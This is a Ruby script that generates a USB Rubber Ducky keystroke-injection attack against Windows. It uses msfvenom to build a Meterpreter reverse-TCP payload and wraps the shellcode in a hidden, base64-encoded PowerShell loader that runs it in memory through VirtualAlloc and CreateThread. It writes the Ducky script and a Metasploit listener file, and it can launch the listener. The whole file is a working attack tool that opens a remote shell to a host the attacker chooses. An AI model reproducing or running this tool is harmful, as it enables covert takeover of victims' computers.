#!/usr/bin/env ruby
# Written by Nishant Parhi

require 'base64'
require 'readline'
def print_error(text)
  print "\e[31m[-]\e[0m #{text}"
end

def print_success(text)
  print "\e[32m[+]\e[0m #{text}"
end

def print_info(text)
  print "\e[34m[*]\e[0m #{text}"
end

def get_input(text)
  print "\e[33m[!]\e[0m #{text}"
end

def rgets(prompt = '', default = '')
  choice = Readline.readline(prompt, false)
  choice == default if choice == ''
  choice
end

def select_host
  host_name = rgets('Enter the host ip to listen on: ')
  ip = host_name.split('.')
  if ip[0] == nil? || ip[1] == nil? || ip[2] == nil? || ip[3] == nil?
    print_error("Not a valid IP\n")
    select_host
  end
  print_success("Using #{host_name} as server\n")
  host_name
end

def select_port
  port = rgets('Port you would like to use or leave blank for [443]: ')
  if port == ''
    port = '443'
    print_success("Using #{port}\n")
    return port
  elsif !(1..65_535).cover?(port.to_i)
    print_error("Not a valid port\n")
    sleep(1)
    select_port
  else
    print_success("Using #{port}\n")
    return port
  end
end

def shellcode_gen(msf_path, host, port)
  print_info("Generating shellcode\n")
  msf_command = "#{msf_path}./msfvenom --payload "
  msf_command << "#{@set_payload} LHOST=#{host} LPORT=#{port} -f c"
  execute  = `#{msf_command}`
  shellcode = clean_shellcode(execute)
  powershell_command = powershell_string(shellcode)
  final = to_ps_base64(powershell_command)
  final
end

def clean_shellcode(shellcode)
  shellcode = shellcode.gsub('\\', ',0')
  shellcode = shellcode.delete('+')
  shellcode = shellcode.delete('"')
  shellcode = shellcode.delete("\n")
  shellcode = shellcode.delete("\s")
  shellcode[0..18] = ''
  shellcode
end

def to_ps_base64(command)
  Base64.encode64(command.split('').join("\x00") << "\x00").gsub!("\n", '')
end

def powershell_string(shellcode)
  s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
  s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
  s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
  s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
  s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
  s << "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
  s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
  s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
  s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
  s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
  s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
  s << '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
  s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
  s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
  s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
  s << %("\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni )
  s << %(-enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& )
  s << %(powershell $cmd $gq";})
end

def ducky_setup(encoded_command)
  print_info("Writing to file\n")
  s = "DELAY 2000\nGUI r\nDELAY 500\nSTRING cmd\nENTER\nDELAY 500\n"
  s << "STRING powershell -nop -wind hidden -noni -enc #{encoded_command}\n"
  s << 'ENTER'
  File.open('powershell_reverse_ducky.txt', 'w') do |f|
    f.write(s)
  end
  print_success("File Complete\n")
end

def metasploit_setup(msf_path, host, port)
  print_info("Setting up Metasploit this may take a moment\n")
  rc_file = 'msf_listener.rc'
  file = File.open("#{rc_file}", 'w')
  file.write("use exploit/multi/handler\n")
  file.write("set PAYLOAD #{@set_payload}\n")
  file.write("set LHOST #{host}\n")
  file.write("set LPORT #{port}\n")
  file.write("set EnableStageEncoding true\n")
  file.write("set ExitOnSession false\n")
  file.write('exploit -j')
  file.close
  system("#{msf_path}./msfconsole -r #{rc_file}")
end
begin
  if File.exist?('/usr/bin/msfvenom')
    msf_path = '/usr/bin/'
  elsif File.exist?('/opt/metasploit-framework/msfvenom')
    msf_path = ('/opt/metasploit-framework/')
  else
    print_error('Metasploit Not Found!')
    exit
  end
  @set_payload = 'windows/meterpreter/reverse_tcp'
  host = select_host
  port = select_port
  encoded_command = shellcode_gen(msf_path, host, port)
  ducky_setup(encoded_command)
  msf_setup = rgets('Would you like to start the listener?[yes/no] ')
  print_info("Compile powershell_reverse_ducky.txt with duckencode.jar\n")
  metasploit_setup(msf_path, host, port) if msf_setup == 'yes'
  print_info("Good Bye!\n")
end